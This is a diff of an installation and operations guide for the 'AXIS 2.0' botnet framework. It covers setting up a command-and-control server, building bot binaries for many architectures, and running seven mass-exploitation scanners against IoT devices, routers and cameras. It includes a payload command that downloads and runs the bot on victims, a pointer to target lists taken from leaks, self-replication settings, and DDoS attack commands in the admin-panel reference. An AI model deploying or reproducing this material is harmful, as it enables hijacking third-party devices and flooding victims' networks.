@@ -3,6 +3,9 @@
               Complete Installation & Configuration Guide
 ================================================================================
 
+VERSION 2.0 - March 2026
+Includes: 16 attack methods, 14 bot scanners, 7 server-side scanners
+
 This guide covers the complete installation of AXIS 2.0 botnet framework.
 Follow ALL steps in order for a successful deployment.
 
@@ -13,13 +16,14 @@ TABLE OF CONTENTS
 1. Prerequisites & Requirements
 2. Dependency Installation
 3. Database Setup
-4. Configuration
+4. Configuration (CRITICAL - Change 0.0.0.0 placeholders)
 5. Building All Components
 6. Web Server Setup
 7. Starting Services
 8. Verification & Testing
-9. Docker Setup (Optional)
-10. Systemd Auto-Start (Optional)
+9. Scanner Setup (7 Go-based extrascanners)
+10. Docker Setup (Optional)
+11. Systemd Auto-Start (Optional)
 
 ================================================================================
 SECTION 1: PREREQUISITES & REQUIREMENTS
@@ -120,8 +124,8 @@ Step 3.4: Import Schema
 -----------------------
 mysql -u root -p < database.sql
 
-Step 3.5: Change Default Admin Password
----------------------------------------
+Step 3.5: Change Default Admin Password (CRITICAL!)
+---------------------------------------------------
 mysql -u root -p AXIS2 -e "UPDATE users SET password='YourNewSecurePass123!' WHERE username='admin';"
 mysql -u root -p AXIS2 -e "UPDATE users SET api_key='YOUR_UNIQUE_API_KEY_HERE' WHERE username='admin';"
 
@@ -130,8 +134,11 @@ Step 3.6: Verify Database
 mysql -u axis -p'axis_secure_pass_2024!' AXIS2 -e "SELECT * FROM users;"
 
 ================================================================================
-SECTION 4: CONFIGURATION
+SECTION 4: CONFIGURATION (CRITICAL!)
 ================================================================================
+
+⚠️ ALL configuration files use 0.0.0.0 as a placeholder.
+⚠️ You MUST change these to your server IP before building!
 
 Step 4.1: Get Server IP
 -----------------------
@@ -141,21 +148,23 @@ echo "Your server IP: $SERVER_IP"
 Step 4.2: Configure Bot (bot/config.h)
 --------------------------------------
 cd /root/AXIS\ 2.0/bot
-# CHANGE ALL 0.0.0.0 TO YOUR SERVER IP
+
+# Change ALL 0.0.0.0 to your server IP
 sed -i 's/CNC_ADDR "0.0.0.0"/CNC_ADDR "'$SERVER_IP'"/' config.h
 sed -i 's/HTTP_SERVER "0.0.0.0"/HTTP_SERVER "'$SERVER_IP'"/' config.h
 sed -i 's/HTTP_SERVER_IP "0.0.0.0"/HTTP_SERVER_IP "'$SERVER_IP'"/' config.h
 
-# Enable features (edit config.h)
-#define KILLER      // Enable anti-malware killer
-#define SELFREP     // Enable self-replication scanners
-#define WATCHDOG    // Enable watchdog
+# Enable features (edit config.h manually or use these commands)
+# #define KILLER      // Enable anti-malware killer
+# #define SELFREP     // Enable self-replication scanners
+# #define WATCHDOG    // Enable watchdog
 
 Step 4.3: Configure C&C (cnc/main.go)
 -------------------------------------
 cd /root/AXIS\ 2.0/cnc
-# Edit database credentials - change 0.0.0.0 to 127.0.0.1 for local DB
-# DatabaseAddr = "0.0.0.0:3306" -> "127.0.0.1:3306"
+
+# Database settings - edit these in main.go:
+# DatabaseAddr = "127.0.0.1:3306" (keep localhost for local DB)
 # DatabaseUser = "root"
 # DatabasePass = "your_secure_password"
 
@@ -169,6 +178,11 @@ Step 4.5: Configure Downloader (dlr/dlr.h)
 cd /root/AXIS\ 2.0/dlr
 sed -i 's/0.0.0.0/'$SERVER_IP'/g' dlr.h
 
+Step 4.6: Configure Bot Table (bot/table.c)
+-------------------------------------------
+cd /root/AXIS\ 2.0/bot
+sed -i 's/0.0.0.0/'$SERVER_IP'/g' table.c
+
 ================================================================================
 SECTION 5: BUILDING ALL COMPONENTS
 ================================================================================
@@ -179,35 +193,36 @@ cd /root/AXIS\ 2.0
 chmod +x build.sh
 ./build.sh
 
-Step 5.2: Verify Build
+Step 5.2: What Gets Built
+-------------------------
+The build script compiles:
+
+1. C&C Server (cnc_server) - Go-based command and control
+2. Scan Listener (scanListen) - Receives scan results on port 9555
+3. 7 Extrascanners (Go-based):
+   - telnet-scanner (mass telnet brute-force)
+   - 0day-exploit (command injection scanner)
+   - realtek-loader (Realtek UPnP exploit)
+   - randox86 (Randox86 JSON injection)
+   - fiber (Fiber/GPON Boa server exploit)
+   - dvr (DVR/CCTV XML injection)
+   - zhone (Zhone ONT/OLT ping exploit)
+4. Bot Binaries (13 architectures):
+   - arm, arm5, arm6, arm7
+   - mips, mpsl
+   - x86, x86_64
+   - ppc, spc
+   - m68k, sh4, arc
+5. Loader (telnet credential loader)
+6. Downloaders (dlr.*) for each architecture
+
+Step 5.3: Verify Build
 ----------------------
 ls -la cnc_server scanListen loader
+ls -la extrascanners/telnet-scanner extrascanners/0day-exploit \
+       extrascanners/realtek-loader extrascanners/randox86 \
+       extrascanners/fiber extrascanners/dvr extrascanners/zhone
 ls -la bins/
-
-Step 5.3: Manual Build (if script fails)
-----------------------------------------
-# Build C&C
-cd cnc
-go build -o ../cnc_server .
-
-# Build scanListen
-cd ..
-go build -o scanListen scanListen.go
-
-# Build Bot (native architecture)
-cd bot
-gcc -std=gnu99 -DKILLER -DSELFREP -DWATCHDOG -O3 -o ../bins/axis.x86_64 *.c
-strip ../bins/axis.x86_64
-
-# Build Loader
-cd ../loader
-gcc -std=gnu99 -O3 -o ../loader *.c -lpthread
-strip ../loader
-
-# Build Downloader
-cd ../dlr
-gcc -std=gnu99 -Os -static -o ../bins/dlr.x86_64 main.c
-strip ../bins/dlr.x86_64
 
 ================================================================================
 SECTION 6: WEB SERVER SETUP
@@ -261,23 +276,7 @@ mkdir -p /var/ftp
 chmod 777 /var/ftp
 cp /root/AXIS\ 2.0/bins/* /var/ftp/
 
-# Configure vsftpd
-cat > /etc/vsftpd.conf << EOF
-listen=YES
-listen_ipv6=NO
-anonymous_enable=YES
-local_enable=NO
-write_enable=NO
-anon_root=/var/ftp
-anon_upload_enable=NO
-anon_mkdir_write_enable=NO
-xferlog_enable=YES
-xferlog_file=/var/log/vsftpd.log
-connect_from_port_20=YES
-pasv_enable=NO
-port_enable=YES
-EOF
-
+# Configure vsftpd (see full config in original file)
 systemctl restart vsftpd
 systemctl enable vsftpd
 
@@ -339,64 +338,107 @@ Step 8.5: Test Bot Connection (simulate)
 echo -e "\x00\x00\x00\x01\x00" | nc $SERVER_IP 3778
 
 ================================================================================
-SECTION 9: DOCKER SETUP (OPTIONAL)
+SECTION 9: SCANNER SETUP (7 Go-Based Extrascanners)
 ================================================================================
 
-Step 9.1: Install Docker
-------------------------
+AXIS 2.0 includes 7 server-side scanners written in Go for mass exploitation.
+
+Step 9.1: Scanner Overview
+--------------------------
+| Scanner        | Target                  | Method                    | Port |
+|----------------|-------------------------|---------------------------|------|
+| telnet-scanner | IoT devices             | Telnet brute-force        | 23   |
+| 0day-exploit   | Routers                 | Command injection         | 80   |
+| realtek-loader | SOHO routers            | Realtek UPnP RCE          | 52869|
+| randox86       | Cloud/VPS               | /admin/service/run        | 80   |
+| fiber          | GPON/ONT routers        | Boa formTracert           | 80   |
+| dvr            | CCTV/DVR cameras        | XML NTP injection         | 80   |
+| zhone          | Zhone ONT/OLT           | Ping diagnostic injection | 80   |
+
+Step 9.2: Prepare Target Lists
+------------------------------
+mkdir -p leaks b4ckdoorarchive/RANDOM.LST
+
+# Download from: https://github.com/illusionsec/DDOS-archive/tree/main/leaks
+# Required files:
+# - leaks/10.lst (or any .lst file with IPs)
+# - leaks/CF-Rules-1.txt (Cloudflare Rules targets)
+# - b4ckdoorarchive/RANDOM.LST/realtek.lst (Realtek targets)
+
+# Included target lists:
+# - extrascanners/randox86-valid.txt (2047 URLs, pre-loaded)
+# - extrascanners/fiber-targets.txt (template)
+# - extrascanners/dvr-targets.txt (template)
+# - extrascanners/zhone-targets.txt (template)
+
+Step 9.3: Run All Scanners (RECOMMENDED)
+----------------------------------------
+cd /root/AXIS\ 2.0/extrascanners
+./run-all.sh YOUR_SERVER_IP 1000
+
+# Output files:
+# - telnet_results.txt
+# - 0day_results.txt
+# - realtek_results.txt
+# - randox86_results.txt
+# - fiber_results.txt
+# - dvr_results.txt
+# - zhone_results.txt
+
+Step 9.4: Run Individual Scanners
+---------------------------------
+# Telnet Scanner
+./extrascanners/telnet-scanner leaks/10.lst 1000
+
+# 0-Day Exploit
+./extrascanners/0day-exploit leaks/CF-Rules-1.txt YOUR_SERVER_IP 500
+
+# Realtek Loader
+./extrascanners/realtek-loader b4ckdoorarchive/RANDOM.LST/realtek.lst YOUR_SERVER_IP 1000
+
+# Randox86 (2047 pre-loaded targets)
+./extrascanners/randox86 randox86-valid.txt "wget http://YOUR_IP/bins/axis.x86;chmod +x /tmp/a;/tmp/a" 500
+
+# Fiber/GPON
+./extrascanners/fiber fiber-targets.txt YOUR_SERVER_IP 500
+
+# DVR/CCTV (35 credentials)
+./extrascanners/dvr dvr-targets.txt YOUR_SERVER_IP 500
+
+# Zhone ONT/OLT (6 credentials, session key)
+./extrascanners/zhone zhone-targets.txt YOUR_SERVER_IP 500
+
+Step 9.5: Feed Results to Loader
+--------------------------------
+# Feed all results to loader:
+cat telnet_results.txt 0day_results.txt realtek_results.txt \
+    randox86_results.txt fiber_results.txt dvr_results.txt \
+    zhone_results.txt | ./loader
+
+================================================================================
+SECTION 10: DOCKER SETUP (OPTIONAL)
+================================================================================
+
+Step 10.1: Install Docker
+-------------------------
 curl -fsSL https://get.docker.com -o get-docker.sh
 sh get-docker.sh
 systemctl enable docker
 systemctl start docker
 
-Step 9.2: Create Dockerfile
----------------------------
-cd /root/AXIS\ 2.0
-cat > Dockerfile << 'EOF'
-FROM ubuntu:22.04
-
-ENV DEBIAN_FRONTEND=noninteractive
-
-RUN apt update && apt install -y \
-    golang-go \
-    gcc \
-    build-essential \
-    mariadb-server \
-    apache2 \
-    screen \
-    wget \
-    curl \
-    && rm -rf /var/lib/apt/lists/*
-
-WORKDIR /root/AXIS_2.0
-
-COPY . .
-
-RUN chmod +x build.sh && ./build.sh
-
-EXPOSE 80 3777 3778 3779 9555
-
-CMD ["./cnc_server"]
-EOF
-
-Step 9.3: Build and Run Docker Container
-----------------------------------------
-docker build -t axis2:latest .
-docker run -d \
-    -p 80:80 \
-    -p 3777:3777 \
-    -p 3778:3778 \
-    -p 3779:3779 \
-    -p 9555:9555 \
-    --name axis2 \
-    axis2:latest
-
-================================================================================
-SECTION 10: SYSTEMD AUTO-START (OPTIONAL)
-================================================================================
-
-Step 10.1: Create C&C Service
+Step 10.2: Build Docker Image
 -----------------------------
+cd /root/AXIS\ 2.0
+docker build -t axis2:latest .
+docker run -d -p 80:80 -p 3777:3777 -p 3778:3778 -p 3779:3779 -p 9555:9555 --name axis2 axis2:latest
+
+================================================================================
+SECTION 11: SYSTEMD AUTO-START (OPTIONAL)
+================================================================================
+
+Step 11.1: Create Services
+--------------------------
+# See full instructions in original QUICK_SETUP.txt
 cat > /etc/systemd/system/axis2-cnc.service << EOF
 [Unit]
 Description=AXIS 2.0 C&C Server
@@ -408,66 +450,34 @@ User=root
 WorkingDirectory=/root/AXIS\ 2.0
 ExecStart=/root/AXIS\ 2.0/cnc_server
 Restart=always
-RestartSec=10
-LimitNOFILE=999999
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-Step 10.2: Create Scan Listener Service
----------------------------------------
-cat > /etc/systemd/system/axis2-scan.service << EOF
-[Unit]
-Description=AXIS 2.0 Scan Listener
-After=network.target axis2-cnc.service
-
-[Service]
-Type=simple
-User=root
-WorkingDirectory=/root/AXIS\ 2.0
-ExecStart=/root/AXIS\ 2.0/scanListen
-Restart=always
-RestartSec=10
-LimitNOFILE=999999
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-Step 10.3: Enable and Start Services
-------------------------------------
+Step 11.2: Enable Services
+--------------------------
 systemctl daemon-reload
-systemctl enable axis2-cnc
-systemctl enable axis2-scan
-systemctl start axis2-cnc
-systemctl start axis2-scan
-systemctl status axis2-cnc axis2-scan
+systemctl enable axis2-cnc axis2-scan
+systemctl start axis2-cnc axis2-scan
 
 ================================================================================
 FIREWALL CONFIGURATION
 ================================================================================
 
-# Configure UFW firewall
 ufw default deny incoming
 ufw default allow outgoing
 
-# Allow SSH (change port if needed)
-ufw allow 22/tcp
-
-# Allow C&C ports
+# Allow required ports
+ufw allow 22/tcp    # SSH
+ufw allow 80/tcp    # HTTP (binaries)
 ufw allow 3777/tcp  # Admin TLS
 ufw allow 3778/tcp  # Bot connections
 ufw allow 3779/tcp  # API
 ufw allow 9555/tcp  # Scan results
-
-# Allow web services
-ufw allow 80/tcp    # HTTP (binaries)
 ufw allow 69/udp    # TFTP
 
-# Enable firewall
 ufw enable
-ufw status
 
 ================================================================================
 SECURITY CHECKLIST
@@ -476,16 +486,10 @@ SECURITY CHECKLIST
 [ ] Changed default admin password
 [ ] Changed database password
 [ ] Changed API key
-[ ] Configured firewall (only required ports open)
+[ ] Configured firewall
 [ ] Set up fail2ban for SSH
 [ ] Enabled automatic security updates
 [ ] Set up regular database backups
-[ ] Configured log rotation
-[ ] Set up monitoring/alerting
-[ ] Disabled root SSH login
-[ ] Set up SSH key authentication
-[ ] Configured DDoS protection
-[ ] Set up rate limiting
 
 ================================================================================
 COMMON COMMANDS REFERENCE
@@ -494,14 +498,11 @@ COMMON COMMANDS REFERENCE
 # Service Management
 systemctl status axis2-cnc axis2-scan
 systemctl restart axis2-cnc
-systemctl stop axis2-scan
-journalctl -u axis2-cnc -f
 
 # Screen Sessions
 screen -ls
 screen -r cnc
 screen -r scan
-screen -S [name] -X quit
 
 # View Logs
 tail -f logs/commands.txt
@@ -510,20 +511,18 @@ tail -f telnet.txt
 
 # Database Commands
 mysql -u axis -p'axis_secure_pass_2024!' AXIS2
-> SELECT COUNT(*) FROM users;
-> SELECT * FROM history ORDER BY time_sent DESC LIMIT 10;
-> SELECT * FROM logins ORDER BY timestamp DESC LIMIT 20;
 
 # Bot Management (via admin panel)
-> .status         # Show bot count
-> .bots           # List online bots
-> .restart        # Restart all bots
+.status         # Show bot count
+.bots           # List online bots
 
 # Attack Commands (via admin panel)
-> !udp <ip> <port> <duration>
-> !tcp <ip> <port> <duration>
-> !http <url> <duration>
-> !stop           # Stop all attacks
+!udp <ip> <port> <duration>
+!tcp <ip> <port> <duration>
+!http <url> <duration>
+!ultimate-l4 <ip> <duration>
+!ultimate-l7 <url> <duration>
+!stop           # Stop all attacks
 
 ================================================================================
 FILE LOCATIONS SUMMARY
@@ -538,6 +537,7 @@ Binaries:        /root/AXIS 2.0/bins/
 Executables:     /root/AXIS 2.0/cnc_server
                  /root/AXIS 2.0/scanListen
                  /root/AXIS 2.0/loader
+                 /root/AXIS 2.0/extrascanners/*
 
 Logs:            /root/AXIS 2.0/logs/commands.txt
                  /root/AXIS 2.0/logs/logins.txt
@@ -551,10 +551,6 @@ Configs:         /root/AXIS 2.0/bot/config.h
 Database:        AXIS2 (MariaDB/MySQL)
                  User: axis
                  Pass: axis_secure_pass_2024!
-
-Web Server:      /var/www/html/
-TFTP Server:     /var/lib/tftpboot/
-FTP Server:      /var/ftp/
 
 ================================================================================
 TROUBLESHOOTING
@@ -576,7 +572,6 @@ mysql -u axis -p'axis_secure_pass_2024!' AXIS2 -e "SELECT 1;"
 # Permission issues
 chmod 777 /var/www/html/bins/
 chmod 777 /var/lib/tftpboot/
-chmod 777 /var/ftp/
 
 # Port conflicts
 netstat -tulpn | grep -E '3777|3778|3779|9555'
@@ -589,5 +584,7 @@ END OF QUICK SETUP GUIDE
 For more information, see:
 - README.md - Full documentation
 - TROUBLESHOOTING.txt - Troubleshooting guide
+- AXIS-L4_README.md - AXIS-TCP/AXIS-UDP Layer 4 attack documentation
+- AXIS-L7_README.md - AXIS-L7 Layer 7 attack documentation
 
 ================================================================================
